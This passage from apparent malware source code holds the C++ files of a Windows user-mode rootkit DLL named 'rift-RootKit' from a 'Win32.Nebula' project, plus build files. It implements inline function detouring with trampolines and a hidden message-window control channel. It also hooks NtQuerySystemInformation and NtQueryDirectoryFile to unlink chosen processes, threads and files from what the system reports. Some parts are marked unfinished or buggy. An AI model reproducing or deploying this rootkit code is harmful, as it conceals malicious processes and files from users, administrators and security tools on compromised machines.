		{2C1D9272-9A62-4169-A851-58E4E6BA53AE}.Release|x64.Build.0 = Release|x64
		{DE4F0368-CFE8-463E-95EE-DCED67FCCD3B}.Debug|x32.ActiveCfg = Debug|Win32
		{DE4F0368-CFE8-463E-95EE-DCED67FCCD3B}.Debug|x32.Build.0 = Debug|Win32
		{DE4F0368-CFE8-463E-95EE-DCED67FCCD3B}.Debug|x64.ActiveCfg = Debug|x64
		{DE4F0368-CFE8-463E-95EE-DCED67FCCD3B}.Debug|x64.Build.0 = Debug|x64
		{DE4F0368-CFE8-463E-95EE-DCED67FCCD3B}.Release|x32.ActiveCfg = Release|Win32
		{DE4F0368-CFE8-463E-95EE-DCED67FCCD3B}.Release|x32.Build.0 = Release|Win32
		{DE4F0368-CFE8-463E-95EE-DCED67FCCD3B}.Release|x64.ActiveCfg = Release|x64
		{DE4F0368-CFE8-463E-95EE-DCED67FCCD3B}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {0858485C-79F4-466F-BA52-322902DDA64B}
	EndGlobalSection
EndGlobal

```

`src/ext/Rootkit/riftrk/detour.cpp`:

```cpp
#include "rk.h"

namespace dt {
	class ThreadUpdate {
	public:
		ThreadUpdate() {
			void* Memory;

			size_t nmem = 0;
			while (1) {
				Memory = VirtualAlloc(nullptr, nmem, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
				NTSTATUS s = hk::NtQuerySystemInformation(0x05, Memory, nmem, (dword*)&nmem);
				if (!s)
					break;
				VirtualFree(Memory, 0, MEM_RELEASE);
			}

			auto ProcessEntry = (SYSTEM_PROCESS_INFORMATION*)Memory;
			u32 PId = GetCurrentProcessId();
			while (true) {
				if ((u32)ProcessEntry->UniqueProcessId == PId) {
					auto ThreadEntry = (SYSTEM_THREAD_INFORMATION*)(ProcessEntry + 1);

					m_ThreadCount = ProcessEntry->NumberOfThreads;
					m_ThreadList = (handle*)HeapAlloc(GetProcessHeap(), NULL, (m_ThreadCount - 1) * sizeof(*m_ThreadList));

					for (u32 i = 0; i < m_ThreadCount; i++) {
						u32 TId = (u32)ThreadEntry->ClientId.UniqueThread;
						if (TId != GetCurrentThreadId()) // Ignore its own Thread
							m_ThreadList[i] = OpenThread(THREAD_SUSPEND_RESUME, false, TId);
						ThreadEntry++;
					}

					break;
				}

				if (!ProcessEntry->NextEntryOffset)
					break;
				ProcessEntry = (SYSTEM_PROCESS_INFORMATION*)((ptr)ProcessEntry->NextEntryOffset + (ptr)ProcessEntry);
			}

			VirtualFree(Memory, 0, MEM_RELEASE);
		}
		~ThreadUpdate() {
			for (u32 i = 0; i < m_ThreadCount; i++)
				CloseHandle(m_ThreadList[i]);
		}

		void SuspendThreads() {
			for (u32 i = 0; i < m_ThreadCount; i++)
				SuspendThread(m_ThreadList[i]);
		}
		void ResumeThreads() {
			for (u32 i = 0; i < m_ThreadCount; i++)
				ResumeThread(m_ThreadList[i]);
		}

	private:
		u32     m_ThreadCount = 0;
		handle* m_ThreadList;
	};

	class TrampolineMgr {
		struct TrampolinePage {
			void* BaseAddress;    // The BaseAddress/Location of the Page Used for the Trampolines
			qword AllocationMask; // A Mask that describes which 64b Blocks in the Page are Used
		};

	public:
		struct SyscallTrampolineX64 {
			// Thunk to Hook (Absolute Jump over RAX)
			byte ToDetour[12];
			// Instructions (up to 40 bytes) of Target followed by an absolute jump to the rest of the Target
			byte TargetThunk[40 + 12];
		};

		void* AllocateUsablePageWithinReach(
			_In_ void* pTarget
		) {
			for (ptr i = (ptr)pTarget; (i + sizeof(SyscallTrampolineX64)) - (ptr)pTarget < 0x7fffffff; i += 4096) {
				// Get PageInformation and Check if Page is Usable
				MEMORY_BASIC_INFORMATION mbi;
				VirtualQuery((void*)i, &mbi, sizeof(mbi));
				if (mbi.State == MEM_FREE) {
					void* mem = VirtualAlloc(mbi.BaseAddress, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
					if (!mem)
						continue;

					return mem;
				}
			}

			return nullptr;
		}
		SyscallTrampolineX64* AlloctateTrampolineWithinReach(
			_In_ void* pTarget
		) {
			// TODO: Finish this by properly allocating pages and managing them
			// Go through allocated TrampolineList first and check if code is withing region,
			// if so use that trampoline instead, if no trampoline has been allocated yet
			// or no trampoline is within 2gb reach allocate a new one

		newalloc: // Allocate a new TrampolinePage
			void* mem = AllocateUsablePageWithinReach(pTarget);
			if (!mem)
				return nullptr; // Couldn't Allocate Page

			// Add Entry to the List of existing Trampoline Pages
			if (m_TPArray)
				m_TPArray = (TrampolinePage*)HeapReAlloc(GetProcessHeap(), NULL, m_TPArray, m_TPSize += sizeof(TrampolinePage));
			else
				m_TPArray = (TrampolinePage*)HeapAlloc(GetProcessHeap(), NULL, m_TPSize += sizeof(TrampolinePage));

			TrampolinePage* Page = m_TPArray + (m_TPSize / sizeof(*m_TPArray) - 1);
			Page->BaseAddress = mem;
			Page->AllocationMask = (qword)1 << 63;

			return (SyscallTrampolineX64*)Page->BaseAddress;
		}

	private:
		TrampolinePage* m_TPArray = nullptr;
		size_t          m_TPSize = 0;
	};
	TrampolineMgr ThkMgr;

	void GenerateAbsoluteJump( // Generates a 12byte Absolute jump
		_In_ void* pCode,      // Address at which to generate jumpcode
		_In_ ptr   Address     // Address to jump to
	) {
		*((word*&)pCode)++ = 0xb848;
		*((qword*&)pCode)++ = Address;
		*(word*&)pCode = 0xe0ff;
	}
	void GenerateIntermediateRelativeJump( // Generates a 5byte relative jump (jump address has to be withing reach of 2gb)
		_In_ void* pCode,                  // The Address at where to generate the Code
		_In_ ptr   Address                 // The Address to Jump to (this has to be within 2gb of the pCode)
	) {
		ptr Offset = (ptr)pCode + 5;                 // Relative Offset
		*((byte*&)pCode)++ = 0xe9;                   // jmp +imm32
		*(dword*&)pCode = (dword)(Address - Offset); // Relative jump Address
	}

	status DetourFunction(                         // Detours a binary function
		_Inout_           void** ppTarget,         // Pointer to pointer containing the address of the Function to hook that will be filled with the new address redirecting to the original code
		_In_              void*  pHook,            // Pointer to the Hook Function that should be inserted
		_In_range_(5, 40) u8     InstructionLength // Count of instructionbytes to relocate into the Trampoline (must be big enough to fit a relative jump (5bytes) and small enough to fit into the trampoline (40bytes))
	) {
		if (InstructionLength < 5 || InstructionLength > 40)
			return S_CREATE(SS_WARNING, SF_ROOTKIT, SC_INVALID_PARAMETER);

		auto pTarget = *ppTarget;
		auto Trampoline = ThkMgr.AlloctateTrampolineWithinReach(pTarget);

		// Generate Bidirectional Trampoline (Thunk)
		GenerateAbsoluteJump(&Trampoline->ToDetour, (ptr)pHook);
		__movsb((byte*)&Trampoline->TargetThunk, (byte*)pTarget, InstructionLength);
		GenerateAbsoluteJump((void*)((ptr)&Trampoline->TargetThunk + InstructionLength), (ptr)pTarget + InstructionLength);
		FlushInstructionCache(GetCurrentProcess(), Trampoline, sizeof(*Trampoline));

		// Start Transaction
		ThreadUpdate tu;
		tu.SuspendThreads();

		// Detour Targetfuction to Hook
		dword Protect;
		VirtualProtect(pTarget, 8, PAGE_EXECUTE_READWRITE, &Protect);
		GenerateIntermediateRelativeJump(pTarget, (ptr)&Trampoline->ToDetour);
	#ifdef _DEBUG
		// Pad the unused bytes within the target function with breakpoints
		__stosb((byte*)((ptr)pTarget + 5), 0xcc, InstructionLength - 5);
	#endif
		VirtualProtect(pTarget, 8, Protect, &Protect);
		FlushInstructionCache(GetCurrentProcess(), pTarget, 8);

		// Set Detoured funtion to Trampoline Jumper
		*ppTarget = &Trampoline->TargetThunk;
		tu.ResumeThreads();
		return 0;
	}
}

```

`src/ext/Rootkit/riftrk/main.cpp`:

```cpp
#include "rk.h"

#ifdef _DEBUG
namespace dbg {
	static PTOP_LEVEL_EXCEPTION_FILTER OldFilter;
	static handle                      VectorHandle;

	status CreateDumpEx(                           // Wrapper for dumpfiledirectory autocreation
		_In_opt_ EXCEPTION_POINTERS* ExceptionInfo // See CreateDump (dbg::CreateDump)
	) {
		auto Path = L"C:\\Win32.Nebula\\Minidumps";
		if (GetFileAttributesW(Path) == INVALID_FILE_ATTRIBUTES)
			if (GetLastError() == ERROR_PATH_NOT_FOUND)
				utl::CreatePath(Path);
			else
				return S_CREATE(SS_ERROR, SF_ROOTKIT, SC_UNKNOWN);
		return CreateDump(Path, ExceptionInfo);
	}

	// Incase an Exception occurs this will immediately catch it
	// and check if the Exception originates from this Module,
	// incase it does it will create a Minidumpfile and Terminate,
	// otherwise it pass control to Higher Level Filters.
	long __stdcall VMinidumpExceptionFilter(
		_In_ EXCEPTION_POINTERS* ExceptionInfo
	) {
		// Check if Expection occurred within Rootkit-Module
		ptr ExceptionAddress = (ptr)ExceptionInfo->ExceptionRecord->ExceptionAddress;
		size_t ModuleSize = utl::GetNtHeader((HMODULE)g_BaseAddress)->OptionalHeader.SizeOfImage;
		if (ExceptionAddress <= (ptr)g_BaseAddress
			|| ExceptionAddress >= (ptr)g_BaseAddress + ModuleSize)
			return EXCEPTION_CONTINUE_SEARCH;
		CreateDumpEx(ExceptionInfo);

		__fastfail((u32)-1);
		return -1;
	}
	// Incase an Excpetion makes it past the VectoredHandlers and the Process Specific ones
	// this Handler will call the original UnHandlerExceptionFilter and respond to its returnvalue
	long __stdcall UhMinidumpExceptionFilter(
		_In_ EXCEPTION_POINTERS* ExceptionInfo
	) {
		if (OldFilter) {
			long s = OldFilter(ExceptionInfo);
			if (s == EXCEPTION_CONTINUE_SEARCH)
				CreateDumpEx(ExceptionInfo);
			return s;
		} else
			CreateDumpEx(ExceptionInfo);
		return EXCEPTION_CONTINUE_SEARCH;
	}
}
#endif

namespace vec {
	// HVector (Handle Vector) is a stl like vector/array,
	// that uses handles to refer to an object instead,
	// allowing for fast traversel (which is needed for the hooks,
	// inorder to not slowdown the api'S as much as possible).
	// Each Hook will get its own (set of) Vector(s),
	// the vectors will be managed by the IO Procedure
	AnyVector::AnyVector()
		: m_Vec(VirtualAlloc(nullptr, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)),
		m_Size(0x1000
	) {
	#ifdef _DEBUG
		__stosb((byte*)m_Vec, 0xcc, m_Size);
	#endif
	}
	AnyVector::~AnyVector() {
		VirtualFree(m_Vec, 0, MEM_RELEASE);
	}

	void* AnyVector::AllocateObject( // Returns a Pointer to the allocated space (valid only for limited time, see FreeObject)
		_In_ size_t Size             // The size of the Entry to be allocated
	) {
		if (Size + sizeof(Entry) > m_Size - m_Used)
			if (ResizeVector(m_Used + (Size + sizeof(Entry))))
				return nullptr; // Failed to resize

		void* mem = (void*)(m_Used + (ptr)m_Vec);
		m_Used += ((Entry*)mem)->Size = Size + sizeof(Entry);
		m_Count++;
		return (void*)((ptr)mem + sizeof(Entry));
	}
	void AnyVector::FreeObject( // Frees/Deallocates a Entry (a call will invalidate all pointers returned by Allocate Object)
		_In_ void* Object       // The Entry to be freed
	) {
		Entry* mem = (Entry*)((ptr)Object - sizeof(Entry));
		size_t nmem = mem->Size;
		__movsb((byte*)mem, (byte*)((ptr)mem + mem->Size),
			m_Used - (((ptr)mem + mem->Size) - (ptr)m_Vec));
		m_Used -= nmem;
		if (m_Used / 0x1000 < m_Size / 0x1000)
			ResizeVector(m_Used);
		m_Count--;
	}

	void* AnyVector::GetFirstEntry() { // Gets the First Entry in the Vector
		return (void*)((ptr)m_Vec + sizeof(Entry));
	}
	void* AnyVector::GetNextEntry( // Gets the next relative entry
		_In_ void* PreviousObject  // Relative Entry
	) {
		Entry* mem = (Entry*)((ptr)PreviousObject - sizeof(Entry));
		if ((((ptr)mem + mem->Size) - (ptr)m_Vec) < m_Used)
			return (void*)(((ptr)mem + mem->Size) + sizeof(Entry));
		return nullptr;
	}

	status AnyVector::ResizeVector( // Grows or Shrinks the Vector
		_In_ size_t NewSize         // Size of new Vector, will be rounded to page size
	) {
		void* mem = VirtualAlloc(nullptr, NewSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (mem) {
			__movsb((byte*)mem, (byte*)m_Vec, m_Used);
			VirtualFree(m_Vec, 0, MEM_RELEASE);
			m_Vec = mem;
			m_Size = RoundUpToMulOfPow2(NewSize, 0x1000);
		} else
			return -1; // Error reallocating Memory
		return 0;
	}

	u32 AnyVector::GetItemCount() { return m_Count; }
	void AnyVector::ReadLock() { AcquireSRWLockShared(&m_srw); }
	void AnyVector::ReadUnlock() { ReleaseSRWLockShared(&m_srw); }
	void AnyVector::WriteLock() { AcquireSRWLockExclusive(&m_srw); }
	void AnyVector::WriteUnlock() { ReleaseSRWLockExclusive(&m_srw); }
}

// RootKit Control Manager
namespace rkc {
	status RkCtlHandler(
		_In_ COPYDATASTRUCT* cds
	) {
	#define RKCTLC(fd, id) ((fd << 4) | (id & 0xf))
		switch (cds->dwData) {
		case RKCTLC(0, 0): // Add Process to Hide
		case RKCTLC(0, 1): // Add ProcessThread to Hide
			g_ProcessList->WriteLock(); {
				bool ThreadFlag = cds->dwData & 0x1;
				void* Object = g_ProcessList->AllocateObject(4 * ThreadFlag + 5);
				*(u8*)Object = ThreadFlag;
				ThreadFlag ? *(u64*)((ptr)Object + 1) = *(u64*)cds->lpData
					: *(u32*)((ptr)Object + 1) = *(u32*)cds->lpData;
			} g_ProcessList->WriteUnlock(); break;

		case RKCTLC(0, 4): // Remove Process(Thread) from Hide
			g_ProcessList->WriteLock(); {
				void* Object = (u32*)g_ProcessList->GetFirstEntry();
				do {
					if (*(u8*)Object == 0) {
						if (*(u32*)((ptr)Object + 1) == *(u32*)cds->lpData) {
							g_ProcessList->FreeObject(Object); break;
						}
					} else if (*(u8*)Object == 1)
						if (*(u32*)((ptr)Object + 5) == *(u32*)cds->lpData) {
							g_ProcessList->FreeObject(Object); break;
						}
				} while (Object = g_ProcessList->GetNextEntry(Object));
			} g_ProcessList->WriteUnlock(); break;

		case RKCTLC(1, 0): // Add File/Directory to hide
			g_ProcessList->WriteLock(); {
				void* Object = g_ProcessList->AllocateObject(cds->cbData);
				__movsb((byte*)Object, (byte*)cds->lpData, cds->cbData);
			} g_ProcessList->WriteUnlock(); break;
		case RKCTLC(1, 1): // Remove File/Directory to hide
			break;

		case RKCTLC(2, 0): // Add RegistryKey to hide
			break;
		case RKCTLC(2, 1): // Remove RegistryKey to hide
			break;

		default:
			return S_CREATE(SS_WARNING, SF_ROOTKIT, SC_UNHANDLED);
		}
	#undef RKCTLC

		return SUCCESS;
	}

	poly __stdcall MessageHandler(
		_In_     HWND hWnd,
		_In_     u32  uMsg,
		_In_opt_ poly wParam,
		_In_opt_ poly lParam
	) {
		switch (uMsg) {
		case WM_COPYDATA: // IPC Message
			return S_SUCCESS(RkCtlHandler((COPYDATASTRUCT*)lParam));

		// Message-Window Creation
		case WM_NCCREATE:
			return true;
		case WM_CREATE:
			return 0;
		}

		return DefWindowProcW(hWnd, uMsg, wParam, lParam);
	}

	struct AsyncSetupCtx {
		HINSTANCE hInstDll;
		handle    hReadEvent;
	};
	long __stdcall IOCtlSetup(
		_In_opt_ AsyncSetupCtx* ctx
	) {
		WNDCLASSEXW wc{};
		wc.cbSize = sizeof(wc);
		wc.lpfnWndProc = (WNDPROC)MessageHandler;
		wc.lpszClassName = L"rift-RootKit(rk)/process:0000";
		wc.hInstance = ctx->hInstDll;

		ATOM awc = RegisterClassExW(&wc);
		if (!awc)
			return -1;

		HWND hWnd = CreateWindowExW(NULL, (const wchar*)awc, wc.lpszClassName,
			NULL, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, nullptr);
		if (!hWnd) {
			UnregisterClassW(wc.lpszClassName, wc.hInstance);
			return -2;
		}

		// Tell LoaderThread that the Handler is ready
		SetEvent(ctx->hReadEvent);

		MSG msg; BOOL bRet;
		while (bRet = GetMessageW(&msg, hWnd, 0, 0)) {
			if (bRet != -1)
				DispatchMessageW(&msg);
			else {
				DestroyWindow(hWnd);
				UnregisterClassW(wc.lpszClassName, wc.hInstance);
				return -3; // if a fail occurs here the server has to unload the kit/reset it
			}
		}

		UnregisterClassW(wc.lpszClassName, wc.hInstance);
		return 0;
	}
}

EXTERN_C EXPORT long __stdcall DbgSetupForLoadLib(
	_In_opt_ void* hInstDll
) {
	g_BaseAddress = hInstDll;

	// Setup IOCtl Handling (RootKit Control)
	handle h[2];
	h[0] = CreateEventW(nullptr, false, false, nullptr);
	rkc::AsyncSetupCtx ctx = { (HINSTANCE)hInstDll, h[0] };
	h[1] = CreateThread(nullptr, 0x1000, (LPTHREAD_START_ROUTINE)rkc::IOCtlSetup, &ctx, 0, nullptr);

	WaitForMultipleObjects(2, h, false, INFINITE);
	CloseHandle(h[0]);

	dword ThreadExitCode;
	GetExitCodeThread(h[1], &ThreadExitCode);
	CloseHandle(h[1]);
	if (ThreadExitCode != STILL_ACTIVE)
		return S_CREATE(SS_ERROR, SF_ROOTKIT, SC_THREAD_DIED);

	dt::DetourFunction(&(void*&)hk::NtQuerySystemInformation, hk::NtQuerySystemInformationHook, 8);
	dt::DetourFunction(&(void*&)hk::NtQueryDirectoryFile, hk::NtQuerySystemInformationHook, 8);

	return true;
}

BOOL __stdcall DllMain(
	_In_ HMODULE hinstDLL,
	_In_ dword   fdwReason,
	_In_ void*   pvReserved
) {
	UNREFERENCED_PARAMETER(pvReserved);

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		{
		#ifdef _DEBUG
			dbg::OldFilter = SetUnhandledExceptionFilter(dbg::UhMinidumpExceptionFilter);
			dbg::VectorHandle = AddVectoredExceptionHandler(true, dbg::VMinidumpExceptionFilter);
		#endif

			// Prepare Vectors for Operation
			g_ProcessList = new vec::AnyVector;
			g_FileList = new vec::AnyVector;

			// Get Function Addresses to Hook
			auto K32 = utl::GetModuleHandleByHash(N_NTDLL);
			hk::NtQuerySystemInformation = (nt::NtQuerySystemInformation_t)
				utl::ImportFunctionByHash(K32, N_NTQUERYSI);
			hk::NtQueryDirectoryFile = (nt::NtQueryDirectoryFile_t)
				utl::ImportFunctionByHash(K32, N_NTQUERYDF);

			return true;
		}
	case DLL_PROCESS_DETACH:
		// Clean Vectors
		delete g_ProcessList;
		delete g_FileList;

	#ifdef _DEBUG
		SetUnhandledExceptionFilter(dbg::OldFilter);
		RemoveVectoredExceptionHandler(dbg::VectorHandle);
	#endif

		return SUCCESS;

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}

	return S_CREATE(SS_WARNING, SF_ROOTKIT, SC_UNHANDLED);
}

```

`src/ext/Rootkit/riftrk/nth.cpp`:

```cpp
/* NT Hooks */
#include "rk.h"

namespace hk {
#pragma region NtQueryDirectoryFile
	void* TranslateFICNameToPointer(
		_In_ void* pData,
		_In_ u32   fclass
	) {
		ptr offset;

		switch (fclass) {
		case nt::FileDirectoryInformation:       offset = 64; break;
		case nt::FileFullDirectoryInformation:   offset = 68; break;
		case nt::FileBothDirectoryInformation:   offset = 81; break;
		case nt::FileNamesInformation:           offset = 12; break;
		case nt::FileIdBothDirectoryInformation: offset = 89; break;
		case nt::FileIdFullDirectoryInformation: offset = 76; break;
		default:
			return nullptr;
		}

		return (void*)((ptr)pData + offset);
	}

	// BUG, TODO: Fix this and finalize the hook, it never hot continued
	// - will probably finish this after being done with the main loader
	nt::NtQueryDirectoryFile_t NtQueryDirectoryFile;
	NTSTATUS NTAPI NtQueryDirectoryFileHook(
		_In_                       handle          FileHandle,
		_In_opt_                   handle          Event,
		_In_opt_                   PVOID           ApcRoutine,
		_In_opt_                   PVOID           ApcContext,
		_Out_                      PVOID           IoStatusBlock,
		_Out_writes_bytes_(Length) PVOID           FileInformation,
		_In_                       ULONG           Length,
		_In_                       ULONG           FileInformationClass,
		_In_                       BOOLEAN         ReturnSingleEntry,
		_In_opt_                   PUNICODE_STRING FileName,
		_In_                       BOOLEAN         RestartScan
	) {
		NTSTATUS s = NtQueryDirectoryFile(FileHandle, Event, ApcRoutine,
			ApcContext, IoStatusBlock, FileInformation, Length,
			FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
		if (!g_FileList->GetItemCount())
			return s;

		constexpr u32 fclass[] = {
			nt::FileDirectoryInformation,
			nt::FileFullDirectoryInformation,
			nt::FileBothDirectoryInformation,
			nt::FileNamesInformation,
			nt::FileIdBothDirectoryInformation,
			nt::FileIdFullDirectoryInformation
		};
		for (u32 i = 0; i < sizeof(fclass) / sizeof(*fclass); i++)
			if (FileInformationClass == fclass[i]) {
				g_FileList->ReadLock();
				if (ReturnSingleEntry) {
					// This Code Hides Single Entry Requests

					const wchar* Entry = (wchar*)g_ProcessList->GetFirstEntry();
					do {
					RedoNext:
						if (!lstrcmpiW((const wchar*)TranslateFICNameToPointer(FileInformation, FileInformationClass), Entry)) {
							s = NtQueryDirectoryFile(FileHandle, Event, ApcRoutine,
								ApcContext, IoStatusBlock, FileInformation, Length,
								FileInformationClass, ReturnSingleEntry, FileName, false);
							goto RedoNext; // redo for next element
						}
					} while (Entry = (wchar*)g_ProcessList->GetNextEntry((void*)Entry));
				} else {
					// This Code will fully unlink Entries from a list of any size (to be imlemented)

				}
				g_FileList->ReadUnlock();

				break;
			}

		return s;
	}
#pragma endregion

#pragma region NtQuerySystemInformation
	status UnlinkProcessEntry(
		_In_ SYSTEM_PROCESS_INFORMATION* spi
	) {
		auto NextEntry = (SYSTEM_PROCESS_INFORMATION*)((ptr)spi->NextEntryOffset + (ptr)spi);
		if (NextEntry->NextEntryOffset)
			spi->NextEntryOffset += NextEntry->NextEntryOffset;
		else
			spi->NextEntryOffset = 0;

		return spi->NextEntryOffset;
	}
	status UnlinkThreadEntry(
		_In_ SYSTEM_PROCESS_INFORMATION* spi,
		_In_ u32                         TId
	) {
		auto stit = (SYSTEM_THREAD_INFORMATION*)(spi + 1);

		for (u16 i = 0; i < spi->NumberOfThreads; i++)
			if ((u32)stit[i].ClientId.UniqueThread == TId) {
				__movsb((byte*)(stit + i), (byte*)(stit + (i + 1)), sizeof(*stit) * (spi->NumberOfThreads - (i - 1)));
				spi->NumberOfThreads--;
				return 0;
			}

		return -1; // ThreadId not Found
	}

	nt::NtQuerySystemInformation_t NtQuerySystemInformation;
	NTSTATUS NTAPI NtQuerySystemInformationHook(
		_In_      ULONG  SystemInformationClass,
		_Out_     PVOID  SystemInformation,
		_In_      ULONG  SystemInformationLength,
		_Out_opt_ PULONG ReturnLength
	) {
		NTSTATUS s = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

		// Execute hook if SystemProcessInformation and atleast one Entry exists
		if (SystemInformationClass == 0x05 && SystemInformationLength >= sizeof(SYSTEM_PROCESS_INFORMATION)) {
			if (!g_ProcessList->GetItemCount())
				return s; // No Items to Hide

			// Setup first Process Entry
			auto PreviousEntry = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
			do {
				if (!PreviousEntry->NextEntryOffset)
					break;

				g_ProcessList->ReadLock();

			RedoNext:
				// The current Entry in the List to be inspected
				auto CurrentEntry = (SYSTEM_PROCESS_INFORMATION*)((ptr)PreviousEntry->NextEntryOffset + (ptr)PreviousEntry);
				void* Entry = g_ProcessList->GetFirstEntry();
				do {
					// Check if Data is a Process Entry
					if (*(u8*)Entry != 0)
						continue;
					u32 PId = *(u32*)((ptr)Entry + 1);

					// Unlink Entry if match
					if (PId == (u32)CurrentEntry->UniqueProcessId) {
						if (!UnlinkProcessEntry(PreviousEntry))
							break;

						goto RedoNext; // redo for next element
					}
				} while (Entry = g_ProcessList->GetNextEntry(Entry));



				// Unlink Threads from List here
				Entry = g_ProcessList->GetFirstEntry();
				do {
					// Check if Data is a ProcessThread Entry
					if (*(u8*)Entry != 1)
						continue;

					u32 PId = *(u32*)((ptr)Entry + 1);
					if ((u32)CurrentEntry->UniqueProcessId == PId)
						UnlinkThreadEntry(CurrentEntry, *(u32*)((ptr)Entry + 5));
				} while (Entry = g_ProcessList->GetNextEntry(Entry));

				g_ProcessList->ReadUnlock();
				PreviousEntry = CurrentEntry;
			} while (PreviousEntry->NextEntryOffset);
		}

		return s;
	}
#pragma endregion
}

```

`src/ext/Rootkit/riftrk/riftrk.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{de4f0368-cfe8-463e-95ee-dced67fccd3b}</ProjectGuid>
    <RootNamespace>riftrk</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <PlatformToolset>v142</PlatformToolset>
    <UseDebugLibraries>true</UseDebugLibraries>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <PlatformToolset>v142</PlatformToolset>
    <UseDebugLibraries>true</UseDebugLibraries>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
    <Import Project="..\shared\shared.vcxitems" Label="Shared" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <OutDir>$(SolutionDir)out\bin\</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
    <TargetName>$(ProjectName)32</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)out\bin\</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
    <TargetName>$(ProjectName)32</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>$(SolutionDir)out\bin\</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
    <TargetName>$(ProjectName)64</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)out\bin\</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
    <TargetName>$(ProjectName)64</TargetName>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <ExceptionHandling>false</ExceptionHandling>
      <CallingConvention>FastCall</CallingConvention>
      <AdditionalOptions>/Zc:sizedDealloc- %(AdditionalOptions)</AdditionalOptions>
